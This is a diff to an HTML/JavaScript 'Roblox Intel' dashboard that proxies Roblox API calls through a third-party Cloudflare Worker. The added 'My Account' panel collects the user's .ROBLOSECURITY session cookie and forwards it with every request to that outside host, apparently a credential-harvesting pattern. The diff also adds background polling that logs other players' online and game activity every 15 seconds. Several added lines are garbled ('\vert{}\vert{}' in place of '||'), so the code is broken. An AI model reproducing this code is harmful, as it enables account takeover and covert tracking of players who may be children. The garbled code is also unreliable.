@@ -1,3 +1,4 @@
+<a_file_with_valid_path path="index.html">
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -14,7 +15,7 @@ body{font-family:Inter,system-ui,sans-serif;background:var(--bg);color:var(--tx)
 header{display:flex;align-items:center;justify-content:space-between;padding:12px 24px;border-bottom:1px solid var(--bd);position:sticky;top:0;background:rgba(7,7,7,.94);backdrop-filter:blur(14px);z-index:60;gap:12px;flex-wrap:wrap}
 .logo{display:flex;align-items:center;gap:10px;font-family:'Space Grotesk',sans-serif;font-weight:600;font-size:13px;letter-spacing:.04em;color:var(--tx);text-decoration:none;cursor:pointer}
 .logo-i{width:26px;height:26px;border-radius:7px;background:var(--s2);border:1px solid var(--bd);display:grid;place-items:center;font-size:13px}
-nav{display:flex;gap:5px}
+nav{display:flex;gap:5px;flex-wrap:wrap}
 nav button{font-family:'Space Grotesk',sans-serif;font-size:11px;font-weight:600;letter-spacing:.07em;text-transform:uppercase;padding:7px 14px;border-radius:999px;border:1px solid transparent;background:transparent;color:var(--mu);cursor:pointer;transition:.15s}
 nav button:hover{color:var(--tx)}
 nav button.on{background:#fff;color:#000}
@@ -93,7 +94,7 @@ main{flex:1;padding:28px 20px 60px;max-width:1100px;width:100%;margin:0 auto}
 .load-card{background:var(--s1);border:1px solid var(--bd);border-radius:12px;padding:16px}
 .load-card .hd{font-size:10px;letter-spacing:.1em;text-transform:uppercase;color:var(--mu);margin-bottom:12px;display:flex;align-items:center;gap:6px}
 .load-card .hd span{margin-left:auto;color:var(--mu2);font-size:11px}
-.load-btn{width:100%;padding:12px;border-radius:9px;border:1px solid var(--bd2);background:var(--s2);color:var(--tx);font-family:'Space Grotesk',sans-serif;font-weight:600;font-size:12px;letter-spacing:.05em;text-transform:uppercase;cursor:pointer}
+.load-btn{width:100%;padding:12px;border-radius:999px;border:1px solid var(--bd2);background:var(--s2);color:var(--tx);font-family:'Space Grotesk',sans-serif;font-weight:600;font-size:12px;letter-spacing:.05em;text-transform:uppercase;cursor:pointer}
 .load-btn:hover{background:var(--s3)}
 .friends-box,.groups-box{display:none;margin-top:12px}
 .filter-in{width:100%;background:var(--bg);border:1px solid var(--bd);border-radius:8px;padding:9px 12px 9px 34px;color:var(--tx);font-size:13px;outline:none;margin-bottom:10px}
@@ -120,8 +121,8 @@ main{flex:1;padding:28px 20px 60px;max-width:1100px;width:100%;margin:0 auto}
 .conn-in{display:grid;grid-template-columns:1fr 1fr;gap:12px;max-width:480px;margin:0 auto 14px}
 @media(max-width:500px){.conn-in{grid-template-columns:1fr}}
 .fld label{display:block;font-size:10px;letter-spacing:.08em;text-transform:uppercase;color:var(--mu);margin-bottom:5px}
-.fld input{width:100%;background:var(--s1);border:1px solid var(--bd);border-radius:9px;padding:11px 13px;color:var(--tx);font-size:13px;outline:none}
-.fld input:focus{border-color:#3a3a3a}
+.fld input,.fld select{width:100%;background:var(--s1);border:1px solid var(--bd);border-radius:9px;padding:11px 13px;color:var(--tx);font-size:13px;outline:none}
+.fld input:focus,.fld select:focus{border-color:#3a3a3a}
 .conn-btn{max-width:480px;margin:0 auto;width:100%;display:block}
 .tree{margin:28px auto 0;max-width:420px}
 .tree-hd{display:flex;align-items:baseline;justify-content:space-between;margin-bottom:16px;padding:0 4px}
@@ -139,9 +140,9 @@ main{flex:1;padding:28px 20px 60px;max-width:1100px;width:100%;margin:0 auto}
 .my-hero{padding:40px 0}
 .my-hero .lb{font-size:10px;letter-spacing:.12em;text-transform:uppercase;color:var(--mu);margin-bottom:8px}
 .my-hero h1{font-family:'Space Grotesk',sans-serif;font-size:1.9rem;font-weight:700;margin-bottom:22px}
-.link-c{background:var(--s1);border:1px solid var(--bd);border-radius:14px;padding:22px;max-width:520px}
+.link-c{background:var(--s1);border:1px solid var(--bd);border-radius:14px;padding:22px;max-width:520px;margin-bottom:20px}
 .link-c .t{font-size:11px;letter-spacing:.08em;text-transform:uppercase;color:var(--mu);margin-bottom:12px}
-.link-r{display:flex;gap:8px}
+.link-r{display:flex;gap:8px;flex-direction:column}
 .link-r input{flex:1;background:var(--bg);border:1px solid var(--bd);border-radius:9px;padding:11px 13px;color:var(--tx);font-size:13px;outline:none}
 .link-n{margin-top:10px;font-size:12px;color:var(--mu2);line-height:1.4}
 footer{border-top:1px solid var(--bd);padding:14px 24px;display:flex;justify-content:space-between;font-size:10px;color:var(--mu2);letter-spacing:.04em;text-transform:uppercase}
@@ -189,6 +190,15 @@ footer{border-top:1px solid var(--bd);padding:14px 24px;display:flex;justify-con
 .view-btn:hover{border-color:#555;background:var(--s2)}
 .view-btn-lg{padding:12px 18px;font-size:12px;width:100%;margin-top:8px;box-sizing:border-box;display:flex}
 .play-btn-lg{padding:12px 18px;font-size:12px;width:100%;margin-top:8px;box-sizing:border-box}
+
+.home-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(220px,1fr));gap:14px;margin-top:20px}
+.home-card{background:var(--s1);border:1px solid var(--bd);border-radius:12px;overflow:hidden;transition:.15s;cursor:pointer;display:flex;flex-direction:column}
+.home-card:hover{border-color:#444;transform:translateY(-2px)}
+.home-card img{width:100%;aspect-ratio:16/9;object-fit:cover;background:#1a1a1a}
+.home-card .info{padding:12px;flex:1;display:flex;flex-direction:column;justify-content:space-between}
+.home-card .title{font-weight:600;font-size:13px;margin-bottom:6px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+.home-card .meta{font-size:11px;color:var(--mu);display:flex;flex-direction:column;gap:3px;font-family:'JetBrains Mono',monospace}
+.filter-box{background:var(--s1);border:1px solid var(--bd);border-radius:12px;padding:16px;margin-bottom:20px;display:grid;grid-template-columns:repeat(auto-fit,minmax(180px,1fr));gap:12px}
 </style>
 </head>
 <body>
@@ -199,10 +209,11 @@ footer{border-top:1px solid var(--bd);padding:14px 24px;display:flex;justify-con
   </a>
   <nav>
     <button id="t-lookup" class="on" onclick="tab('lookup')">Lookup</button>
+    <button id="t-home" onclick="tab('home')">Home / Places</button>
     <button id="t-connection" onclick="tab('connection')">Connection</button>
     <button id="t-compare" onclick="tab('compare')">Compare</button>
     <button id="t-favorites" onclick="tab('favorites')">Favorites</button>
-    <button id="t-myroblox" onclick="tab('myroblox')">My Roblox</button>
+    <button id="t-myroblox" onclick="tab('myroblox')">My Account</button>
   </nav>
   <div class="hdr-r">
     <button onclick="showHistory()">↻ History</button>
@@ -231,6 +242,38 @@ footer{border-top:1px solid var(--bd);padding:14px 24px;display:flex;justify-con
   </div>
   <div class="dossier" id="dossier"></div>
 </div>
+
+<div id="p-home" class="panel">
+  <div class="my-hero" style="padding:20px 0 10px">
+    <div class="lb">🎮 Experience Explorer</div>
+    <h1>Roblox Games & Places</h1>
+    <p style="color:var(--mu);font-size:13px;margin-bottom:20px">Browse, filter, and discover games across all Roblox categories.</p>
+    <div class="filter-box">
+      <div class="fld">
+        <label>Search Keyword / ID</label>
+        <input id="hmSearch" type="text" placeholder="e.g. Adopt Me, Blox Fruits or ID" onkeydown="if(event.key==='Enter')loadHomeGames()"/>
+      </div>
+      <div class="fld">
+        <label>Category / Sort</label>
+        <select id="hmCategory" onchange="loadHomeGames()">
+          <option value="popular">Popular / Top Grossing</option>
+          <option value="trending">Trending</option>
+          <option value="toprated">Top Rated</option>
+        </select>
+      </div>
+      <div class="fld">
+        <label>Contains Word</label>
+        <input id="hmContains" type="text" placeholder="Filter in title..." oninput="filterHomeLocal()"/>
+      </div>
+      <div class="fld" style="display:flex;align-items:flex-end">
+        <button class="btn btn-w" style="width:100%" onclick="loadHomeGames()">⌕ SEARCH PLACES</button>
+      </div>
+    </div>
+    <div class="st" id="hmSt"></div>
+    <div id="hmGrid" class="home-grid"></div>
+  </div>
+</div>
+
 <div id="p-connection" class="panel">
   <div class="conn-hero">
     <div class="lb">⇄ Degrees of Separation</div>
@@ -245,6 +288,7 @@ footer{border-top:1px solid var(--bd);padding:14px 24px;display:flex;justify-con
     <div id="cRes"></div>
   </div>
 </div>
+
 <div id="p-compare" class="panel">
   <div class="conn-hero">
     <div class="lb">Compare Dossiers</div>
@@ -259,11 +303,12 @@ footer{border-top:1px solid var(--bd);padding:14px 24px;display:flex;justify-con
     <div id="cmpRes" style="text-align:left;max-width:720px;margin:20px auto 0"></div>
   </div>
 </div>
+
 <div id="p-favorites" class="panel">
   <div class="my-hero">
     <div class="lb">★ Saved Profiles</div>
-    <h1>Favorites</h1>
-    <p style="color:var(--mu);font-size:13px;margin-bottom:16px;max-width:520px">Saved players. Archive logs game sessions while recording is on. Data stays in this browser.</p>
+    <h1>Favorites & Background Tracker</h1>
+    <p style="color:var(--mu);font-size:13px;margin-bottom:16px;max-width:520px">Saved players automatically track online/game activity in real-time when recording is enabled.</p>
     <div style="display:flex;gap:8px;flex-wrap:wrap;margin-bottom:20px">
       <button class="btn" onclick="exportAllArchives('json')">Export Archives JSON</button>
       <button class="btn" onclick="exportAllArchives('csv')">Export Archives CSV</button>
@@ -272,19 +317,21 @@ footer{border-top:1px solid var(--bd);padding:14px 24px;display:flex;justify-con
     <div id="favList"></div>
   </div>
 </div>
+
 <div id="p-myroblox" class="panel">
   <div class="my-hero">
-    <div class="lb">🔒 Self Control Panel</div>
-    <h1>My Roblox</h1>
+    <div class="lb">🔒 Account Management</div>
+    <h1>My Roblox Account</h1>
     <div class="link-c">
-      <div class="t">Link your Roblox User ID</div>
+      <div class="t">Roblox Session Cookie (.ROBLOSECURITY)</div>
       <div class="link-r">
-        <input id="myId" type="text" placeholder="Your Roblox User ID"/>
-        <button class="btn" onclick="linkMe()">🔗 LINK</button>
+        <input id="myCookie" type="password" placeholder="_|WARNING:-DO-NOT-SHARE-THIS..."/>
+        <button class="btn" onclick="saveAuthCookie()">🔑 SAVE & LOGIN</button>
       </div>
-      <div class="link-n">Live read-only monitoring. Profile editing & friend management unlock once your Roblox session cookie is linked.</div>
+      <div class="link-n">Your cookie is stored locally in your browser and passed to Cloudflare Worker to manage your profile directly from this dashboard.</div>
       <div class="st" id="mySt"></div>
     </div>
+    <div id="myAccountInfo" style="display:none" class="card"></div>
   </div>
 </div>
 </main>
@@ -292,9 +339,12 @@ footer{border-top:1px solid var(--bd);padding:14px 24px;display:flex;justify-con
   <span>ROBLOX INTEL // TYPE-01</span>
   <span>UNOFFICIAL · DATA VIA ROBLOX API</span>
 </footer>
+
 <script>
 const W='https://site1.lvlyvcbcla.workers.dev';
 let searchMode='player';
+let authCookie=localStorage.getItem('rbx_cookie')||'';
+
 function setMode(m){
   searchMode=m;
   document.getElementById('modePlayer').classList.toggle('on',m==='player');
@@ -380,14 +430,22 @@ function launchPlay(placeId){
 
 async function F(url,opt={}){
   const t=encodeURIComponent(url);
-  const r=await fetch(W+'/?url='+t,{method:opt.method||'GET',headers:opt.headers||{},body:opt.body||undefined});
+  const headers=opt.headers||{};
+  if(authCookie){
+    headers['x-roblox-cookie']=authCookie;
+  }
+  const r=await fetch(W+'/?url='+t,{method:opt.method||'GET',headers:headers,body:opt.body||undefined});
   return r;
 }
+
 function tab(n){
   document.querySelectorAll('.panel').forEach(p=>p.classList.remove('on'));
   document.querySelectorAll('nav button').forEach(b=>b.classList.remove('on'));
   document.getElementById('p-'+n).classList.add('on');
   document.getElementById('t-'+n).classList.add('on');
+  if(n==='favorites')renderFavList();
+  if(n==='home'&&!homeLoaded)loadHomeGames();
+  if(n==='myroblox')checkMyAccount();
 }
 function goHome(){tab('lookup');document.getElementById('hero').style.display='block';document.getElementById('dossier').style.display='none';document.getElementById('dossier').innerHTML='';document.getElementById('st').textContent='';if(liveTimer){clearInterval(liveTimer);liveTimer=null}}
 function clearAll(){goHome();document.getElementById('q').value='';hist=[];lsSet('rbx_hist','[]')}
@@ -406,6 +464,250 @@ function pLabel(t){
 }
 function fmt(n){if(n==null)return'—';return n.toLocaleString()}
 function fDate(iso){if(!iso)return'—';try{return new Date(iso).toLocaleDateString('en-US',{month:'short',day:'numeric',year:'numeric'})}catch{return iso}}
+
+/* --- HOME / PLACES EXPLORER --- */
+let homeLoaded=false;
+let rawHomeGames=[];
+
+async function loadHomeGames(){
+  const kw=document.getElementById('hmSearch').value.trim();
+  const cat=document.getElementById('hmCategory').value;
+  const st=document.getElementById('hmSt');
+  const grid=document.getElementById('hmGrid');
+  
+  st.className='st';st.innerHTML='<span class="sp"></span>Fetching Roblox experiences...';
+  grid.innerHTML='';
+  
+  try{
+    let games=[];
+    if(kw){
+      if(/^\d+$/.test(kw)){
+        document.getElementById('q').value=kw;
+        setMode('place');
+        tab('lookup');
+        scanPlace();
+        return;
+      }
+      const sr=await F('https://games.roblox.com/v1/games/list?model.keyword='+encodeURIComponent(kw)+'&model.maxRows=30');
+      if(sr.ok){
+        const sd=await sr.json();
+        games=sd.games||sd.data||[];
+      }
+    }else{
+      const sortToken=cat==='popular'?'TopGrossing':cat==='trending'?'Popular':'TopRated';
+      const sr=await F(`https://games.roblox.com/v1/games/list?model.sortType=${sortToken}&model.maxRows=30`);
+      if(sr.ok){
+        const sd=await sr.json();
+        games=sd.games||sd.data||[];
+      }
+    }
+
+    rawHomeGames=games;
+    homeLoaded=true;
+    st.textContent='';
+    renderHomeList(rawHomeGames);
+  }catch(e){
+    st.className='st err';
+    st.textContent='Failed to load places: '+e.message;
+  }
+}
+
+function filterHomeLocal(){
+  const term=document.getElementById('hmContains').value.toLowerCase().trim();
+  if(!term){renderHomeList(rawHomeGames);return;}
+  const filtered=rawHomeGames.filter(g=>(g.name||'').toLowerCase().includes(term));
+  renderHomeList(filtered);
+}
+
+function renderHomeList(games){
+  const grid=document.getElementById('hmGrid');
+  if(!games.length){
+    grid.innerHTML='<div style="color:var(--mu);grid-column:1/-1;text-align:center;padding:30px">No games found matching your criteria.</div>';
+    return;
+  }
+  
+  const uids=games.map(g=>g.universeId||g.id).filter(Boolean);
+  grid.innerHTML=games.map(g=>{
+    const pid=g.placeId||g.rootPlaceId||g.id;
+    const uid=g.universeId||g.id;
+    const nm=(g.name||'Experience').replace(/</g,'&lt;');
+    const creator=g.builder||g.creatorName||'Roblox';
+    return `
+    <div class="home-card" onclick="document.getElementById('q').value='${pid}';setMode('place');tab('lookup');scanPlace()">
+      <img id="hm-img-${uid}" src="" alt="" onerror="this.style.background='#111'"/>
+      <div class="info">
+        <div class="title">${nm}</div>
+        <div class="meta">
+          <span>By: ${String(creator).replace(/</g,'&lt;')}</span>
+          <span>Visits: ${fmt(g.placeVisits||g.visits)}</span>
+          <span>Playing: ${fmt(g.playerCount||g.playing)}</span>
+        </div>
+        <div style="display:flex;gap:6px;margin-top:10px" onclick="event.stopPropagation()">
+          ${playBtn(pid)}
+          ${viewBtn(pid)}
+        </div>
+      </div>
+    </div>`;
+  }).join('');
+
+  if(uids.length){
+    F(`https://thumbnails.roblox.com/v1/games/icons?universeIds=${uids.join(',')}&size=512x512&format=Png`)
+      .then(r=>r.json())
+      .then(d=>{
+        (d.data||[]).forEach(t=>{
+          const el=document.getElementById(`hm-img-${t.targetId}`);
+          if(el&&t.imageUrl)el.src=t.imageUrl;
+        });
+      }).catch(()=>{});
+  }
+}
+
+/* --- MY ACCOUNT & AUTH --- */
+async function saveAuthCookie(){
+  const val=document.getElementById('myCookie').value.trim();
+  const st=document.getElementById('mySt');
+  if(!val){st.className='st err';st.textContent='Please enter a valid cookie';return}
+  authCookie=val;
+  localStorage.setItem('rbx_cookie',val);
+  st.className='st';st.textContent='Cookie saved! Authenticating...';
+  checkMyAccount();
+}
+
+async function checkMyAccount(){
+  const info=document.getElementById('myAccountInfo');
+  const st=document.getElementById('mySt');
+  if(!authCookie){
+    info.style.display='none';
+    return;
+  }
+  try{
+    const r=await F('https://users.roblox.com/v1/users/authenticated');
+    if(!r.ok)throw new Error('Session expired or invalid cookie');
+    const u=await r.json();
+    st.className='st';st.textContent='Authenticated as '+u.name;
+    info.style.display='block';
+    info.innerHTML=`
+      <div class="card-t" style="margin-bottom:12px">● Active Control Session</div>
+      <div class="info-row"><span class="k">Logged User</span><span class="v">${u.displayName} (@${u.name})</span></div>
+      <div class="info-row"><span class="k">User ID</span><span class="v">${u.id}</span></div>
+      <div style="margin-top:14px;display:flex;gap:8px">
+        <button class="btn" onclick="document.getElementById('q').value='${u.id}';setMode('player');tab('lookup');scan()">Inspect My Profile</button>
+        <button class="btn" style="background:var(--rd);border-color:var(--rd)" onclick="authCookie='';localStorage.removeItem('rbx_cookie');location.reload()">Logout</button>
+      </div>`;
+  }catch(e){
+    st.className='st err';
+    st.textContent='Authentication failed: '+e.message;
+    info.style.display='none';
+  }
+}
+
+/* --- FAVORITES & AUTO-TRACKING --- */
+function toggleFav(){
+  if(!curUser)return;
+  const uid=String(curUser.userId);
+  const idx=favorites.findIndex(f=>String(f.id)===uid);
+  if(idx>=0){
+    favorites.splice(idx,1);
+    if(archiveTimers[uid]){clearInterval(archiveTimers[uid]);delete archiveTimers[uid]}
+  }else{
+    favorites.push({id:uid,name:curUser.user.name,display:curUser.user.displayName,tracking:true});
+    startBackgroundTracking(uid);
+  }
+  lsSet('rbx_favs',JSON.stringify(favorites));
+  render(curUser);
+}
+
+function renderFavList(){
+  const box=document.getElementById('favList');
+  if(!favorites.length){
+    box.innerHTML='<div style="color:var(--mu);padding:20px 0">No favorites added yet. Search a player and click ☆ Favorite to start monitoring.</div>';
+    return;
+  }
+  box.innerHTML=favorites.map(f=>{
+    const logs=archiveLogs[f.id]||[];
+    const isTracking=f.tracking!==false;
+    return `
+    <div class="fav-card">
+      <img src="https://www.roblox.com/headshot-thumbnail/image?userId=${f.id}&width=150&height=150&format=png"/>
+      <div class="fi">
+        <div class="fn">${f.display||f.name}</div>
+        <div class="fsub">@${f.name} · ${f.id}</div>
+      </div>
+      <div class="fbtns">
+        <button class="${isTracking?'arch-on':''}" onclick="toggleFavTracking('${f.id}')">${isTracking?'● Live Monitoring':'○ Monitoring Off'}</button>
+        <button onclick="document.getElementById('q').value='${f.id}';setMode('player');tab('lookup');scan()">View Dossier</button>
+        <button onclick="removeFav('${f.id}')">Remove</button>
+      </div>
+      <div class="arch-box">
+        <div class="ah">Activity Telemetry Logs (${logs.length})</div>
+        ${logs.length?logs.slice(-10).reverse().map(l=>`
+          <div class="arch-row">
+            <span class="t">${l.date||'—'}</span>
+            <span class="g">${l.event||'Online'} : ${l.game||'Browsing/In Game'}</span>
+          </div>
+        `).join(''):'<div style="color:var(--mu2);font-size:11px">No activity recorded yet. Monitoring runs while page is open.</div>'}
+      </div>
+    </div>`;
+  }).join('');
+}
+
+function toggleFavTracking(id){
+  const f=favorites.find(x=>String(x.id)===String(id));
+  if(f){
+    f.tracking=!f.tracking;
+    lsSet('rbx_favs',JSON.stringify(favorites));
+    if(f.tracking)startBackgroundTracking(id);
+    else if(archiveTimers[id]){clearInterval(archiveTimers[id]);delete archiveTimers[id]}
+    renderFavList();
+  }
+}
+
+function removeFav(id){
+  favorites=favorites.filter(x=>String(x.id)!==String(id));
+  lsSet('rbx_favs',JSON.stringify(favorites));
+  if(archiveTimers[id]){clearInterval(archiveTimers[id]);delete archiveTimers[id]}
+  renderFavList();
+}
+
+function startBackgroundTracking(uid){
+  if(archiveTimers[uid])return;
+  let lastState=null;
+  const poll=async()=>{
+    try{
+      const pr=await F('https://presence.roblox.com/v1/presence/users',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({userIds:[+uid]})});
+      if(!pr.ok)return;
+      const pd=await pr.json();
+      const p=pd.userPresences?.[0];
+      if(!p)return;
+      
+      let gameName='Browsing';
+      if(p.userPresenceType===2&&p.universeId){
+        try{
+          const gr=await F(`https://games.roblox.com/v1/games?universeIds=${p.universeId}`);
+          if(gr.ok){const gd=await gr.json();gameName=gd.data?.[0]?.name||'In Experience'}
+        }catch{}
+      }
+      
+      const currentState=`${p.userPresenceType}:${gameName}`;
+      if(lastState&&lastState!==currentState&&p.userPresenceType!==0){
+        if(!archiveLogs[uid])archiveLogs[uid]=[];
+        archiveLogs[uid].push({
+          type:'session',
+          event:pLabel(p.userPresenceType).t,
+          game:gameName,
+          date:new Date().toLocaleTimeString()
+        });
+        lsSet('rbx_archive',JSON.stringify(archiveLogs));
+      }
+      lastState=currentState;
+    }catch(e){}
+  };
+  poll();
+  archiveTimers[uid]=setInterval(poll,15000);
+}
+
+// Start auto-tracking for all active favorites on page load
+favorites.forEach(f=>{if(f.tracking!==false)startBackgroundTracking(f.id)});
 
 async function scanPlace(){
   const idn=document.getElementById('q').value.trim();
@@ -503,7 +805,7 @@ async function scanPlace(){
   const pid=g.placeId||g.rootPlaceId||'';
   const nm=(g.name||'Game').replace(/</g,'&lt;');
   return `<div class="gr-item" style="gap:10px">
-<div class="gi" style="cursor:pointer" onclick="document.getElementById(\'q\').value=\'${pid || g.universeId}\';scanPlace()"><div class="gn">${nm}</div><div class="gr">Place ${pid || '—'} · Universe ${g.universeId || '—'}</div></div>${pid ? `<div style="display:flex;gap:6px;flex-shrink:0">${playBtn(pid)}${viewBtn(pid)}</div>` : ''}
+<div class="gi" style="cursor:pointer" onclick="document.getElementById(\'q\').value=\'${pid || g.universeId}\';scanPlace()"><div class="gn">${nm}</div><div class="gr">Place ${pid || '—'} · Universe ${g.universeId \vert{}\vert{} '—'}</div></div>${pid ? `<div style="display:flex;gap:6px;flex-shrink:0">${playBtn(pid)}${viewBtn(pid)}</div>` : ''}
 </div>`;
 }).join('')}</div>`;
         btn.disabled=false;
@@ -633,7 +935,7 @@ async function scanPlace(){
 </div>
 ${desc?`<div class="card" style="margin-bottom:16px"><div class="card-t" style="margin-bottom:8px">Description</div><div style="font-size:13px;color:var(--mu);line-height:1.5;white-space:pre-wrap">${String(desc).slice(0,1500).replace(/</g,'&lt;')}</div></div>`:''}
 ${mediaUrls.length?`<div class="card" style="margin-bottom:16px"><div class="card-t" style="margin-bottom:8px">Media</div><div style="display:flex;flex-wrap:wrap;gap:8px">${mediaUrls.map(u=>`<img src="${u}" style="width:140px;height:80px;object-fit:cover;border-radius:8px;border:1px solid var(--bd);background:#111" onerror="this.style.display='none'"/>`).join('')}</div></div>`:''}
-${placesList.length?`<div class="card"><div class="card-t" style="margin-bottom:10px">Places in universe · ${placesList.length}</div><div class="gr-list">${placesList.map(p=>{
+${placesList.length?`<div class="card"><div class="card-t" style="margin-bottom:10px">Places / Subplaces in universe · ${placesList.length}</div><div class="gr-list">${placesList.map(p=>{
   const pid=String(p.id);
   const isRoot=pid===rootId;
   const icon=placeIcons[pid]||'';
@@ -903,7 +1205,7 @@ async function loadFriends(uid){
 ${list.map(f=>{
   const img=thumbs[String(f.id)]||'';
   const nm=(f.displayName||f.name||'').replace(/</g,'&lt;');
-  return `<div class="fr-item" data-name="${(f.name || '').toLowerCase()} ${(f.displayName || '').toLowerCase()}" data-id="${f.id}" onclick="document.getElementById('q').value=this.dataset.id;scan()">
+  return `<div class="fr-item" data-name="${(f.name || '').toLowerCase()} ${(f.displayName \vert{}\vert{} '').toLowerCase()}" data-id="${f.id}" onclick="document.getElementById('q').value=this.dataset.id;scan()">
 <img src="${img}" alt="" onerror="this.onerror=null;this.src='https://www.roblox.com/headshot-thumbnail/image?userId=${f.id}&width=150&height=150&format=png';"/>
 <div class="nm">${nm}</div>
 <div class="id">${f.id}</div>
@@ -935,7 +1237,7 @@ async function loadGroups(uid){
       const gr=g.group||{};
       const role=g.role||{};
       return `<div class="gr-item">
-<div class="gi"><div class="gn">${gr.name || '?'}</div><div class="gr">${role.name || 'Member'} · ${(gr.memberCount || 0).toLocaleString()} members</div></div>
+<div class="gi"><div class="gn">${gr.name || '?'}</div><div class="gr">${role.name \vert{}\vert{} 'Member'} ·${(gr.memberCount || 0).toLocaleString()} members</div></div>
 <a href="https://www.roblox.com/groups/${gr.id}" target="_blank" rel="noopener">↗</a>
 </div>`}).join('')}</div>`;
     box.style.display='block';
@@ -1226,13 +1528,11 @@ function exportAllArchives(fmt){
     a.click();
     return;
   }
-  let lines=['userId,game,joined,left,duration,date'];
+  let lines=['userId,game,event,date'];
   for(const id of ids){
     for(const e of (archiveLogs[id]||[])){
-      if(e.type==='session'){
-        const g=String(e.game||'').replace(/"/g,'');
-        lines.push('"'+id+'","'+g+'","'+(e.joined||'')+'","'+(e.left||'')+'","'+(e.duration||'')+'","'+(e.date||'')+'"');
-      }
+      const g=String(e.game||'').replace(/"/g,'');
+      lines.push('"'+id+'","'+g+'","'+(e.event||'')+'","'+(e.date||'')+'"');
     }
   }
   const blob=new Blob([lines.join(String.fromCharCode(10))],{type:'text/csv'});
@@ -1295,7 +1595,7 @@ async function trace(){
   const to=document.getElementById('cTo').value.trim();
   const st=document.getElementById('cSt');
   const res=document.getElementById('cRes');
-  if(!/^\d+$/.test(from) || !/^\d+$/.test(to)){st.className='st err';st.textContent='Both IDs must be numeric';return}
+  if(!/^\d+$/.test(from) \vert{}\vert{} !/^\d+$/.test(to)){st.className='st err';st.textContent='Both IDs must be numeric';return}
   if(from===to){st.className='st';st.textContent='Same user — 0 degrees';res.innerHTML='';return}
   st.className='st';st.innerHTML='<span class="sp"></span>Tracing connection…';
   res.innerHTML='';
@@ -1325,96 +1625,18 @@ async function trace(){
         const tr=await F(`https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${ids}&size=150x150&format=Png&isCircular=true`);
         if(tr.ok){const td=await tr.json();(td.data||[]).forEach(t=>{heads[t.targetId]=t.imageUrl})}
       }catch{}
-      const midNodes=show.map(m=>({id:m.id,name:m.name,displayName:m.displayName,head:heads[m.id]||null}));
+      const midNodes=show.map(m=>({id:m.id,name:m.name,displayName:m.displayName,head:heads[m.id]}));
       st.textContent='';
-      res.innerHTML=treeHtml(2,[{...fromInfo,head:fromHead},{id:to,name:toInfo.name,displayName:toInfo.displayName,head:toHead}],midNodes,mutuals.length);
+      res.innerHTML=treeHtml(2,[{...fromInfo,head:fromHead},{...toInfo,head:toHead}],midNodes,mutuals.length);
       return;
     }
 
-    st.textContent='No 1st or 2nd degree connection found.';
+    st.textContent='No direct connection found within 2 degrees';
   }catch(e){
     st.className='st err';
-    st.textContent=e.message||'Trace failed';
+    st.textContent=e.message||'Tracing failed';
   }
 }
-
-function saveFavs(){
-  lsSet('rbx_favs',JSON.stringify(favorites));
-  renderFavs();
-}
-
-function toggleFav(){
-  if(!curUser)return;
-  const id=String(curUser.userId);
-  const idx=favorites.findIndex(f=>String(f.id)===id);
-  if(idx>=0){
-    favorites.splice(idx,1);
-  }else{
-    favorites.push({
-      id:id,
-      name:curUser.user.name,
-      displayName:curUser.user.displayName,
-      headshot:curUser.headshot||curUser.avatar||''
-    });
-  }
-  saveFavs();
-  const btn=document.getElementById('favBtn');
-  if(btn){
-    const isFav=favorites.some(f=>String(f.id)===id);
-    btn.className='btn-fav '+(isFav?'on':'');
-    btn.textContent=isFav?'★ Favorited':'☆ Favorite';
-  }
-}
-
-function renderFavs(){
-  const box=document.getElementById('favList');
-  if(!box)return;
-  if(!favorites.length){
-    box.innerHTML='<div style="color:var(--mu2);font-size:13px">No saved favorites yet.</div>';
-    return;
-  }
-  box.innerHTML=favorites.map(f=>`
-<div class="fav-card">
-  <img src="${f.headshot||''}" alt="" onerror="this.src=''"/>
-  <div class="fi">
-    <div class="fn">${(f.displayName||f.name||'').replace(/</g,'&lt;')}</div>
-    <div class="fsub">@${f.name} · ${f.id}</div>
-  </div>
-  <div class="fbtns">
-    <button onclick="document.getElementById('q').value='${f.id}';tab('lookup');scan()">Inspect</button>
-    <button onclick="removeFav('${f.id}')">Remove</button>
-  </div>
-</div>`).join('');
-}
-
-function removeFav(id){
-  favorites=favorites.filter(f=>String(f.id)!==String(id));
-  saveFavs();
-}
-
-function linkMe(){
-  const id=document.getElementById('myId').value.trim();
-  const st=document.getElementById('mySt');
-  if(!/^\d+$/.test(id)){
-    st.className='st err';
-    st.textContent='Please enter a valid numeric Roblox User ID';
-    return;
-  }
-  lsSet('rbx_my_id',id);
-  st.className='st';
-  st.textContent='Linked User ID: '+id;
-}
-
-window.addEventListener('DOMContentLoaded',()=>{
-  renderFavs();
-  const myId=lsGet('rbx_my_id');
-  if(myId){
-    const el=document.getElementById('myId');
-    if(el)el.value=myId;
-    const st=document.getElementById('mySt');
-    if(st)st.textContent='Linked User ID: '+myId;
-  }
-});
 </script>
 </body>
 </html>
